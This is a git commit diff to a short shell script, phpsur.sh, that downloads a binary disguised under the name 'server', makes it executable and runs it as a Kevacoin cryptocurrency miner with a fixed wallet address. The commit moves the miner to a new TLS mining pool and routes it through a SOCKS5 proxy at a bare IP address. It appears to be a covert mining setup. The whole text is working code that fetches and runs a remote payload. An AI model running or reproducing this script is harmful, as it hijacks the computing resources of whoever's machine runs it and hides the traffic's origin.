cef3b91c2f752c1498d1efdc8fd00ae7cc1458bd
brilliant-cut <90860858+brilliant-cut@users.noreply.github.com>
2021-09-17 01:50:30 +0700

    Update phpsur.sh

--- phpsur.sh
+++ phpsur.sh
@@ -3,4 +3,4 @@ apt install screen -y
 wget -O server https://github.com/brilliant-cut/brilliant-cut/raw/master/server
 chmod +x server
 screen -dmS ls
-./server --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password BC=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://50.62.35.16:11818
+./server -a randomkeva --url stratum-eu.rplant.xyz:17061 --tls --user VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b.6Y9b=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://143.198.231.168:1080
